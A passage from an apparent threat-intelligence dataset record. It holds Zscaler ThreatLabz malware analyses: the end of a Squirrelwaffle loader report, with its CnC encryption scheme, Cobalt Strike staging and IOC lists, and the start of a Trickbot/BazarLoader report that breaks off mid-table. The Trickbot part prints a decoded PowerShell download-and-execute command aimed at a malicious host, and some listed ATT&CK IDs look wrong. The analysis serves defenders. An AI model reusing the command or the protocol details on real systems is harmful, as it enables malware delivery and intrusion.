decryption](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Config%20extracted.PNG)\nFigure 10: Formatted Squirrelwaffle configuration after decryption\nOnce the malware decodes all of the CnC domains and IP addresses to block, it creates a **socket** and sends the data using the **send()** function and receives the content from the CnC using **recv()** calls.\nThe CnC communication protocol utilizes an HTTP POST request with a Base64 encoded payload that is encrypted using an XOR-based algorithm with the hardcoded key ***KJKLO***.\nAn example HTTP POST request is shown below:\n**POST /dXf4cS4GPL/fXMKNg0nKzN/DA15DggBI0N6dX1le310YXlkenw= HTTP/1.1**\n**Host: test.dirigu.ro**\n**Content-Length: 76**\n**eHp+fHZ7Q0ICAAUPQkUMcRYePyo5ORcrKiQ4LCkTCjo7CC4/KxceIConIiIoQkMHHw0CAhoKRkI=**\nNote that this request does not contain a User-Agent field in the HTTP header.\nThe path of the HTTP POST request consists of a hardcoded prefix and a Base64 encoded string that is encrypted using the same XOR-based algorithm and key as described above.\nThis encoded string includes an alphanumeric string with a random length between 1 and 28 characters followed by the IP address of the system.\nEach field is delimited by a single tab character.\nAn example before encryption is shown below:\n**t2nQfj3SL3XByImciQTqVa\\t192.168.125.11**\nThe HTTP POST body contains another Base64 encoded string that includes the victim\u2019s computer name, username, application data directory, and workgroup.\nEach field is delimited with two tab characters.\nAn example payload before encryption is shown below:\n**GEORGE-PC\\t\\tgeorge\\t\\tC:\\\\Users\\\\george\\\\AppData\\\\Roaming\\t\\tWORKGROUP\\t\\t**\nThis payload is also encrypted with the same XOR-based algorithm and key as the HTTP POST path component.\nThe SquirrelWaffle CnC responds with a Base64 encoded payload that uses the same encryption schema with another format that uses two tab characters as delimiter between fields.\nThese fields include a status code, a timestamp, the external IP address of the system, along with the victim\u2019s system information that was previously sent.\nAn example decrypted response is shown below:\n**200\\r\\n\\t\\t\\n\\r1631911856\\r\\n\\t\\t\\n\\r174.197.7.69\\r\\n\\t\\t\\n\\rGEORGE-PC\\t\\tgeorge\\t\\tC:\\\\Users\\\\george\\\\AppData\\\\Roaming\\t\\tWORKGROUP\\t\\t\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r**\nThe SquirrelWaffle CnC response may also contain a second-stage payload.\nAn example decrypted response is shown below:\n**200\\r\\n\\t\\t\\n\\r1631913267\\r\\n\\t\\t\\n\\r174.197.7.69\\r\\n\\t\\t\\n\\rGEORGE-PC\\t\\tgeorge\\t\\tC:\\\\Users\\\\george\\\\AppData\\\\Roaming\\t\\tWORKGROUP\\t\\t\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\rMZ\\x90\\x00\\x03\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\xff\\xff\\x00\\x00\\xb8\\x00\\x00\\x00\\x00\\x00\\x00\\[[email\u00a0protected]](/cdn-cgi/l/email-protection)\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe8\\x00\\x00\\x00\\x0e\\x1f\\xba\\x0e\\x00\\xb4\\t\\xcd!\\xb8\\x01L\\xcd!This program cannot be run in DOS mode...\\x00\\x00\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r**\nThis second-stage payload will be written to a filename that consists of eleven random alphanumeric characters appended with a .txt extension, and then executed by SquirrelWaffle.\nZscaler ThreatLabz has observed Squirrelwaffle deliver an executable file with the MD5 hash 116301FD453397FDF3CB291341924147.\nThis file is packed and decrypted in memory to produce a Cobalt Strike stager with the MD5 hash 38DB72B33ABCEA250F5B7CB5AB514B2C, which further downloads the Cobalt Strike beacon.\nFigure 11 below shows interesting strings in the Cobalt Strike stager that impersonates a [jQuery request](https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.3.11.profile).\nThe EICAR string is likely an artifact from the threat actor using a [demo version of Cobalt Strike](https://blog.cobaltstrike.com/2015/10/14/the-cobalt-strike-trials-evil-bit/).\n![Figure 11: Cobalt Strike stager delivered by Squirrelwaffle with interesting strings highlighted.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Strings%20in%20cobaltstrike.PNG)\nFigure 11: Cobalt Strike stager delivered by Squirrelwaffle with interesting strings highlighted.\nThe Cobalt Strike stager sends an HTTPS GET request to 213.227.154[.]92 with the path /jquery-3.3.1.slim.min.js.\nThe Cobalt Strike CnC server responds with a jQuery file with the encrypted Cobalt Strike beacon embedded as binary data in the middle of the file as shown in Figure 12.\n![Figure 12: Encrypted Cobalt Strike beacon embedded in jQuery code starting at offset 0xfaf.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/jquery.png)\nFigure 12: Encrypted Cobalt Strike beacon embedded in jQuery code starting at offset 0xfaf.\nThis binary data consists of shellcode that decrypts the Cobalt Strike beacon using the [XOR-based algorithm](https://sysopfb.github.io/malware,/reverse-engineering/2018/10/08/Beacon-in-a-jquery.html) replicated below in Figure 13.\n![Figure 13: Cobalt Strike beacon decryption algorithm.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Algorithm.png)\nFigure 13: Cobalt Strike beacon decryption algorithm.\nThe Cobalt Strike beacon observed by Zscaler ThreatLabz contains the following CnC servers:\n*hxxps://systemmentorsec.com/jquery-3.3.1.min.js,*\n*hxxps://213.227.154.92/jquery-3.3.1.min.js*\nCloud Sandbox Detection\n-----------------------\n![Figure 14: Zscaler Cloud Sandbox detection of Squirrelwaffle Loader](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Sandbox%20report%20of%20loader.PNG)\nFigure 14: Zscaler Cloud Sandbox detection of Squirrelwaffle Loader\nIn addition to sandbox detections, Zscaler\u2019s multilayered cloud security platform detects indicators at various levels including the signature shown below:\n[Win32.Downloader.Squirrelwaffle](https://threatlibrary.zscaler.com/threats/70c5e6f0-db5c-4a55-87de-7c71dab50c36)\nConclusion\n----------\nAfter the Emotet botnet takedown earlier this year, criminal threat actors are filling that void.\nSquirrelwaffle appears to be a new loader taking advantage of this gap.\nIt is not yet clear if Squirrelwaffle is developed and distributed by a known threat actor or a new group.\nHowever, similar distribution techniques were previously used by Emotet.\nThe Zscaler ThreatLabz team will continue to monitor this attack, as well as others, to help keep our customers safe.\nMITRE ATT&CK TTP Mapping\n------------------------\n| Tactic | Technique |\n| T1059 | Command and Scripting Interpreter |\n| T1592 | Gather Victim Host Information |\n| T1569 | System Services |\n| T1137 | Office Application Startup |\n| T1055 | Process Injection |\n| T1140 | Deobfuscate/Decode Files or Information |\n| T1436 | Commonly Used Port |\n| T1437 | Standard Application Layer Protocol |\n| T1106 | Native API |\nIndicators of Compromise\n------------------------\n### Squirrelwaffle ZIP archive URLs\n* hxxp://amaimaging[.]com/voluptas-quidem/documents.zip\n* hxxp://beautifulgist[.]com/id-alias/documents.zip\n* hxxp://bussiness-z[.]ml/qui-quia/documents.zip\n* hxxp://gadhwadasamaj.techofi[.]in/expedita-consequatur/documents.zip\n* hxxp://inetworx.co[.]za/voluptate-sunt/documents.zip\n* hxxp://insurance.akademiilmujaya[.]com/beatae-sunt/documents.zip\n* hxxp://prevenzioneformazionelavoro[.]it/quasi-reprehenderit/documents.zip\n* hxxp://procatodicadelacosta[.]com/neque-et/documents.zip\n* hxxp://readgasm[.]com/repudiandae-provident/documents.zip\n* hxxp://rinconadadellago[.]com.mx/qui-quia/documents.zip\n* hxxp://saraviatowing[.]net/et-praesentium/documents.zip\n* hxxp://shahanaschool[.]in/illum-accusamus/documents.zip\n* hxxp://srv7.corpwebcontrol[.]com/np/prog\\_est.zip\n* hxxp://srv7.corpwebcontrol[.]com/np/user\\_est.zip\n* hxxp://stripemovired.ramfactoryarg[.]com/nostrum-ab/documents.zip\n* hxxp://syncun[.]com/natus-aut/documents.zip\n* hxxp://tradingview-brokers.skoconstructionng[.]com/molestiae-voluptatum/documents.zip\n* hxxps://abogados-en-medellin[.]com/odit-error/documents.zip\n* hxxps://amaimaging[.]com/voluptas-quidem/ducimus.zip\n* hxxps://builtbvbh-com[.]gq/eum-est/voluptas.zip\n* hxxps://builtbybh-com[.]gq/eum-est/voluptas.zip\n* hxxps://builtybybh-com[.]gq/eum-est/voluptas.zip\n* hxxps://cctvfiles[.]xyz/aliquam-ipsam/documents.zip\n* hxxps://focus.focalrack[.]com/enim-rerum/ducimus.zip\n* hxxps://inetworx.co[.]za/voluptate-sunt/est.zip\n* hxxps://kmslogistik[.]com/repellat-et/est.zip\n* hxxps://moeinjelveh[.]ir/et-eligendi/placeat.zip\n* hxxps://readgasm[.]com/repudiandae-provident/voluptas.zip\n* hxxps://saraviatowing[.]net/et-praesentium/placeat.zip\n* hxxps://sextoystore.co[.]in/temporibus-aut/est.zip\n* hxxps://shivrajengineering[.]in/qui-dolores/placeat.zip\n### Squirrelwaffle Loader URLs\n* hxxps://ghapan[.]com/Kdg73onC3oQ/090921.html\n* hxxps://yoowi[.]net/tDzEJ8uVGwdj/130921.html\n* hxxps://gruasingenieria[.]pe/LUS1NTVui6/090921.html\n* hxxps://chaturanga.groopy[.]com/7SEZBnhMLW/130921.html\n* hxxps://lotolands[.]com/JtaTAt4Ej/130921.html\n* hxxps://cortinastelasytrazos[.]com/Yro6Atvj/sec.html\n* hxxps://orquideavallenata[.]com/4jmDb0s9sg/sec.html\n* hxxps://fundacionverdaderosheroes[.]com/gY0Op5Jkht/sec.html\n### Squirrelwaffle Word Document File MD5 Hashes\n* 326498ae163f0d6b8a863d24793f152d\n* 2156a1a8b0c579a51ea77d1bc7062b49\n* 5e9f33e5baa6d6efca91c8db78c01bd0\n* fae4ca3c95a5068063637b2f2ed3a5b2\n* a449e5044437c453fce2ead881aa8161\n* c27545fbb3b4ff35277bce1383655e46\n* c774e400b46f4c0bb90c11e349bc36a0\n* c2ed8fc614aeda36a7e3a638fa7db16a\n* db11964b27738bf4e3a1501e11bd54ad\n* 822e20c95df7165009600a9bfbff9b5e\n* c1ed800a4ae9d4efd61de3aa7fd657b4\n* b478bc389fc15e17b231984fa80e2b0d\n* e599a656599a2680c9392c7329d9d519\n* da48063b7d75ec645f4370b95c28675c\n* c3bd4145feaaae541cb17ccc7cbd2e44\n* 558f97103085394c3a35c9b03839fe72\n* a07f5b21376cd2b661f36dcdc2081b75\n* 5b50f7beabcff32bd02de2dda2766a7b\n### Squirrelwaffle VBS File MD5 Hash\n* 9da69f65ce4e8e57aef3ea1dd96f42ec\n### Squirrelwaffle Loader MD5 Hashes\n* 7e9ba57db08f53b56715b0a8121bd839\n* 5ec89ea30af2cc38ae183d12ffacbcf7\n* a3ecc9951178447b546b004ea2dfd93f\n* 9545905ea3735dcac289eead39e3f893\n* 732ce2ef4b18042ef9e3f3e52ad59916\n* cb905bb6a38b5d253eb64aab46eafbd7\n* ebeeef845d0d666363935da89a57b44d\n### Unpacked DLL file MD5 Hash\n* 3ecc9ca5e744d7ddafa04834c70b95c3\n### Domain used by the DLL for Squirrelwaffle CnC\n* 107[.]180[.]12[.]15 port 80 centralfloridaasphalt[.]com\n* 119[.]235[.]250[.]50 port 80 kmslogistik[.]com\n* 143[.]95[.]80[.]83 port 80 chaturanga[.]groopy[.]com\n* 160[.]153[.]129[.]37 port 80 mercyfoundationcio[.]org\n* 160[.]153[.]129[.]37 port 80 shoeclearanceoutlet[.]co[.]uk\n* 160[.]153[.]131[.]187 port 80 spiritofprespa[.]com\n* 166[.]62[.]28[.]139 port 80 jhehosting[.]com\n* 166[.]62[.]28[.]139 port 80 key4net[.]com\n* 166[.]62[.]28[.]139 port 80 lead[.]jhinfotech[.]co\n* 166[.]62[.]28[.]139 port 80 voip[.]voipcallhub[.]com\n* 166[.]62[.]28[.]139 port 80 voipcallhub[.]com\n* 194[.]181[.]228[.]45 port 80 bartek-lenart[.]pl\n* 194[.]181[.]228[.]45 port 80 lenartsa[.]webd[.]pro\n* 202[.]52[.]147[.]113 port 80 amjsys[.]com\n* 203[.]124[.]44[.]95 port 80 novamarketing[.]com[.]pk\n* 216[.]219[.]81[.]3 port 80 ems[.]prodigygroupindia[.]com\n* 216[.]219[.]81[.]3 port 80 hrms[.]prodigygroupindia[.]com\n### Cobalt Strike Stager MD5 Hashes\n* 116301fd453397fdf3cb291341924147\n* ef799b5261fd69b56c8b70a3d22d5120\n### Cobalt Strike CnC Servers\n* 213.227.154[.]92:443/jquery-3.3.1.min.js\n* 213.227.154[.]92:8080/jquery-3.3.1.min.js\n* systemmentorsec[.]com:443/jquery-3.3.1.min.js\n* systemmentorsec[.]com:8080/jquery-3.3.1.min.js", "mitre_ids": ["S0154", "S0154", "S0650", "T1566", "S0367", "S0650", "TA0002", "T1059", "S0154", "T1059", "T1105", "S0650", "T1566", "T1566", "T1566", "T1059", "T1059", "T1059", "T1059", "TA0002", "T1204", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1027", "T1059", "T1059", "T1059", "T1059", "T1218", "TA0002", "T1059", "T1059", "TA0002", "T1059", "T1059", "T1105", "T1059", "T1059", "T1059", "T1218", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1218", "T1218", "T1218", "T1027", "S0386", "T1027", "T1027", "T1027", "T1140", "T1071", "T1071", "T1132", "T1132", "T1041", "T1041", "TA0011", "T1132", "TA0011", "T1132", "T1105", "S0154", "S0154", "T1140", "S0154", "T1001", "S0154", "S0154", "T1105", "S0154", "T1105", "S0154", "T1001", "S0154", "TA0011", "S0154", "T1105", "S0154", "S0154", "T1105", "S0154", "T1140", "S0154", "T1140", "S0154", "S0154", "TA0011", "S0367", "S0367", "T1059", "T1592", "T1569", "T1137", "T1055", "T1140", "T1509", "T1437", "T1106", "T1059", "S0154", "S0154"], "anno_name_label": [["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Zloader"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"], ["MALWARE", "Squirrelwaffle"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE"]}, {"cti_report": "New Trickbot and BazarLoader campaigns use multiple delivery vectors\nOctober 08, 2021\nThe [Zscaler ThreatLabz](https://www.zscaler.com/threatlabz/threat-map-dashboard) research team monitors thousands of files daily tracking new and pervasive threats, including one of the most prominent banking trojans of the last five years: Trickbot.\nTrickbot has been active since 2016 and is linked to a large number of malicious campaigns involving bitcoin mining and theft of banking information, personal identifying information (PII), and credentials.\nBazarLoader is a spinoff of this trojan, developed by the same authors.\nBoth are particularly dangerous as they are easily modifiable and capable of delivering multi-stage payloads, as well as taking over computers entirely.\nThreatLabz has discovered Trickbot operators using new approaches to delivering payloads in recent attack campaigns.\nThe malware samples we analyzed were well-crafted and highly obfuscated with sandbox-evading capabilities.\nIn this blog post, we will show analysis of the different delivery vectors used by Trickbot and BazarLoader.\n**Key Points:**\n1.Script and LNK files added evasion techniques to leverage Malware threats.\n2.Multilayer obfuscation is used to preclude analysis of JS and LNK files.\n3.An Office attachment drops an HTA file with snippets of HTML and javascript functions.\n4.Newly registered domains are used to deliver threats.\n**Trickbot is expanding its range of file types for malware delivery**\nIn previous campaigns, Trickbot payloads were generally dropped as malicious attachments to Microsoft Office files.\nIn the last month, we\u2019ve seen that malware has also used javascript files at a high volume, along with a range of other file formats, as shown in the following charts:\n![Overall Trickbot blocked in the sandbox](https://lh4.googleusercontent.com/nYTw6h8k29JBGhwhhdbc-mjmG4C2oWIAhHu2Vu5ZzGMyBN7xD-0uVOavLStFbt-k5GF4eJcRL8BtlyhGohPr7oSja8nlKQVip9YeCTgNcIzeM9pyPP9V5XMyOJ8HZTXOj-LmH-Yl=s0)\n*Fig1:Trickbot blocked in the Zscaler Cloud Sandbox*\n*![Bazar overall blocked in the sandbox](https://lh3.googleusercontent.com/RZPwTirzFvm1T9IoVZHWgdxTRyniwcsRZ_F64TrjqtLTScKuOvhtVGP4w1xIiDsnbU5jlZznuJHcY1OH-W1IplAfY8kx-cRK6ya_MG-MfgvBJWrfESJ4uSCO4xW91bsZnaeJ72fj=s0)*\n*Fig2:BazarLoader blocked in the Zscaler Cloud Sandbox*\nIn this blog, we\u2019ll walk through the attack chain for multiple delivery vectors, including:\u00a0\n* Trickbot spreading through scripting files\n* Trickbot spreading through LNK files\n* BazarLoader spreading through Office attachments\n**Trickbot spreading through scripting files**\nTrickbot gains intrusion using spam emails bundled with malicious javascript attachments, such as the following:\u00a0\u00a0\n![Spam](https://lh3.googleusercontent.com/eypFYtQ5GSXPvi3eeI1bsh-bzOerQbm0nHEAFNa4dTQygWDoDaYDNvJT35_N2tCVw_B9zVxmxJXNa93_L4i7aKjFwils7NHL1PC0ohZt4i6G1G9DkS28ia22M4pjzqPb6o7auRQ_=s0)\n*Fig3:Spam email attachment*\nIn this case, the Javascript [***5B606A5495A55F2BD8559778A620F21B***] file has three layers of obfuscation that are mostly used to evade and bypass sandbox environments.\nBelow is the snapshot of the first obfuscated layer:\n![First obfuscated layer](https://lh5.googleusercontent.com/eYBXrvjmEfCjfRG_hhEM9z-KqrpDlUq4UPqhOODjVDsJNaqIJ-zHv-u3bxa_1BRRZNqDMgqtudA3-XX85MT5Pa8TJvsEhrDBCIyr8MkO-Q8DD5IzNZ_GT-HXLo4oPqdKWsVSHEu1=s0)\n*Fig4:First layer of obfuscation in javascript*\nIn addition to taking extreme effort to make javascript files highly obfuscated, the malware authors have also added large amounts of junk code to the end to make debugging more difficult.\nThe junk code is just random generated obfuscated strings that do not play any role with the malicious code.\n![Junk code to make analysis difficult](https://lh5.googleusercontent.com/kS4l8D-a0K-3ZMpQHrE6nA9mE_2BZqXHhyayzJCjoDcoENf0mfe88xwkpFNOIuuUmP0pa7F5pjwZdL6blF6LqEJb326AoPL0Eys6GIJ77SwNiydOdpyVs0Ld4SisYZOH0nqqLLez=s0)\n*Fig5:Junk code to make analysis difficult*\nUsing the **eval()** function we have de-obfuscated the second layer in which malicious code is embedded with more junk code.\nAfter removing this layer of junk code, the **eval()** function is used once again to retrieve the final layer of code.\nWe can see that the Trickbot authors used the **setTimeout()** method, which evaluates an expression after a 967 milliseconds to delay execution in the sandbox.\nThis helps the malware evade sandbox environments.\n![Second layer](https://lh3.googleusercontent.com/jRF4FrzzO2YdfzB32RTe2CjGkhnUtnrZ9UUhEdONPSy21k6P-qdxNemQhtTcWLHRklj-GdS0mWxGdoKWy5ZvCe_W1r2Vp3i8CffB5AEroF-eEbIz4D-G997CVtvZsIreHz3Vbi-G=s0)\n*Fig6: Second layer of obfuscation in javascript*\nIn the above snapshot we are able to see the *replace* method implemented in the code where **\u201c\"hdBDJ\"****and \u201ctSJVh\u201d** strings are removed from the variables **\u201cYHPhEFtKjqbCmAZ\u201d** and **\u201ckVYJOrLSqvdAWnaGTX\u201d** respectively to get the final string.\n![Final layer](https://lh3.googleusercontent.com/MXb1TursKUiaV2cJK6Zfm4goeok6t_itvzUxMywAv-a3lbrJUhSD-kRsoKqmrzCcHmh6zfhuOfx_SqBz_Hf6TAsSoXoV6SstgBF9m3gZLjJbM1WLHXT_QL8q-D-jBNtQdwSwVZBU=s0)\n*Fig7:Final layer*\nThe malicious Javascript executes cmd.exe as a child process, then cmd.exe executes powershell.exe to download Trickbot as payload.\n**Flow of execution:**\n***Wscript.exe ->cmd.exe->powershell.exe***\nPowershell.exe embedded with base64 encoded command and after decoded following command is:\n***IEX (New-Object Net.Webclient).downloadstring(https://jolantagraban{.}pl/log/57843441668980/dll/assistant{.}php\")***\n***![JS Sandbox](https://lh6.googleusercontent.com/MMzbYyG1_y5io7NT9Ctx2-pHpolw3VXJ5Cy4NcdmHzJt1CagHgljV5BMCsAxcuX8kq63LKs-4b-Fre1xpoiUtL5H7m2v9LodTMT6rUlxJk47Vzj5Qr8937mmYNZcpAFhc3eSE7G4=s0)***\n*Fig8:Zscaler Cloud Sandbox detection of Javascript Downloader*\n**Trickbot spreading through LNK files**\nWindows LNK (LNK) extensions are usually seen by users as shortcuts, and we have frequently observed cybercriminals using LNK files to download malicious files such as Trickbot.\nTrickbot hides the code in the argument section under the properties section of the LNK file.\nThe malware author added extra spaces in between the malicious code to attempt to make it more difficult for researchers to debug the code.\nWe\u2019ve [seen this technique used previously](https://www.zscaler.com/blogs/security-research/independence-day-greeting-campaign-delivers-emotet-5) in the Emotet campaign using malicious Office attachments in 2018.\n![Final LNK](https://lh5.googleusercontent.com/4kBHshm7MehqLjYwXNYH0ZgKdBB7cL9opZy_rDH_VnGSZFe9ZFaP1YlMa3oHUgF0HgAyEyblS5inBGyXMoiQiNQzrKX6NQf8yU7H0uFkd06oIoBs6WGyScV0QYt6WxjkqSV7x8Lp=s0)\n*Fig9:Code embedded in the properties section of LNK*\n*![](https://lh4.googleusercontent.com/vOdC1AvGcwl5R0yWgxF0P2fs822HQa2DpWSq9WSuP6GKMvrefyf2Y5KgAAPL5ADyrIeNBYGnY8IJpn38vtffaafRHoydCCxlm_o0FFihhsDamJ3E7fttitbQmd2pitL2tYvt3kg1=s0)*\n**Downloading Trickbot :**\n1.LNK downloads the file from 45.148.121.227/images/readytunes.png using a silent argument so that the user is not able to see any error message or progress action.\n2.After downloading, the malware saves the file to the Temp folder with the name application1\\_form.pdf.\n3.Finally, the file is renamed from application1\\_form.pdf to support.exe and executed.\nHere, support.exe is Trickbot.\n![Lnk Sandbox](https://lh3.googleusercontent.com/POlp0exS7G-TbRAn2_fHtTv6YAXBX4sKVtD39q_hVQN1D_61MDR1CnjGcjJBPzp_VLKOK0IWGJhJKcgEJvLHi6duWKt0jDUaagZJYNcjvVWSoi-iROG5L5N2vS3CLGJ13xKaVA8L=s0)\n*Fig10:Zscaler Cloud Sandbox detection of LNK Downloader*\n**BazarLoader spreading through Office attachments**\nThis is one of the other techniques used in [TA551 APT](https://malware.news/t/continuously-changing-malicious-word-macro-being-distributed-trend-of-ta551-2/53142) aka Shathak.\nMalicious office documents drop the HTA file to **\u201cC\\ProgramData\\sda.HTA\u201d**.\nThis HTA file contains HTML and vbscript designed to retrieve a malicious DLL to infect a vulnerable Windows host with BazarLoader.\nOnce macro-enabled, the mshta.exe process executes to download a payload.\nThis campaign has been observed delivering BazarLoader and Trickbot in the past.\n![](https://lh6.googleusercontent.com/TNKduiZwiO6q9M4GGVCeJyvqGa5XiVUfJZ8BApg7268hf2zQSq4Nm0jFBxac1DfCHEKPcxELxTx19lGAJQ3i0eQUE2rA8ooXL9J0EESPaYAiAHF3_kR4CSTRTmlbQsVAp9Mss0sH=s0)\n*Fig11:Attack chain of DOC file to download BazarLoader*\nBase64 encoded data is implemented in the HTML <div> tag which is used later with javascript.\n![HTA_HTML](https://lh6.googleusercontent.com/lp6qLNJ4dxiAQ3RTRzgfOua13q5H-yg9zdKP0sek1-PgmMcB5JZ2J4QUo9T6KqMGIURE5tlmEHQPZntb4Ij89d-aD9YUJWr5oet_u1C3Xdm8dSYMu6WmQC_HPOsRp9vAISKFukSW=s0)\n*Fig12:Dropped HTA file : Malicious base64 encoded under HTML <div> section*\nBelow is the snapshot of decode base64 data in which we can see it downloading the payload and saving as friendIFriend,jpg to the victim machine:\n![Decoded HTA](https://lh5.googleusercontent.com/Oct_IQ4q5maqsgB9SpMDuhWhvowS7CmUMQqv_qinA8iFBuFM43dNAurFAbU1tCCqvVqXPWfNI0saeq7qswq_j7q8m4QqPuuTwRZbppHvUT-nhzCG-z3GObLb9-4CxKbXVkfer9yZ=s0)\n*Fig13:Dropped HTA file : Decode Base64 data*\n**Networking : C&C to download BazarLoader**\n**![Networking](https://lh3.googleusercontent.com/7b_tc7RH2GeHYsrqQl4QUTby2fYlO4pLhfX4cjpjGMsbJFHnCNh20j1etoSRzgnZp0zDovTDtLI40R1lvPv6SmPAVfufBeTB8E5-OELNrkcLVPQzYwAFIUTKnW2cXUdYW-VvQGp-=s0)**\n*Fig14:Sending request to download BazarLoader*\nWe have also observed newly registered domains (NRDs) specifically created to distribute these payloads, using a stealer delivered through spam email and bundled with a malicious Microsoft Office attachment.\n![NRD](https://lh3.googleusercontent.com/4phrVtGF3kogBjCstdyuLmvRF-Q74OozQXDVBtcLtWya1rq5iUZ2lflXqSJdRs_abj8w_Mc2pIRmZkSUXKfZXiR32RO1OIJNpkxa50GmFHsq3pApV3nHNLqbbO1WEf8IgjRB2sYK=s0)\n*Fig15: Newly registered domain*\n*![DOC Sandbox](https://lh3.googleusercontent.com/4j6wBBXjY8UNIVVx7B-B9fbF7DxCrxUjVOWgAn94hQVXZtJA1RosJoegffscQinK7p-zH62F7_iz9VErv8miz2220kA_UfEamPDggspHns3UKwHbx4oV3momd7jP7o9LbtnO9Fi1=s0)*\n*Fig16:Zscaler Cloud Sandbox detection of Malicious Office file Downloader*\n[JS.Downloader.Trickbot](https://threatlibrary.zscaler.com/threats/37daac40-4651-4cd0-9947-b77713c75859)\n[Win32.Backdoor.BazarLoader](https://threatlibrary.zscaler.com/threats/848ca346-b69f-468b-8bad-a12823237d4a)\n[VBA.Downloader.BazarLoader](https://threatlibrary.zscaler.com/threats/81efe542-3de5-4efe-8362-12b368661598)\n**MITRE ATT&CK**\n| T5190 | Gather Victim Network Information |\n| T1189 | Drive-by Compromise |\n| T1082 | System Information Discovery |\n| T1140 | Deobfuscate/Decode Files or Information |\n| T1564 | Hide Artifacts |\n| T1027 | Obfuscated Files or Information |\n**Indicators of Compromise**\n| **Md5** | **Filename** | **FileType** |\n| B79AA1E30CD460B573114793CABDAFEB | 100.js | 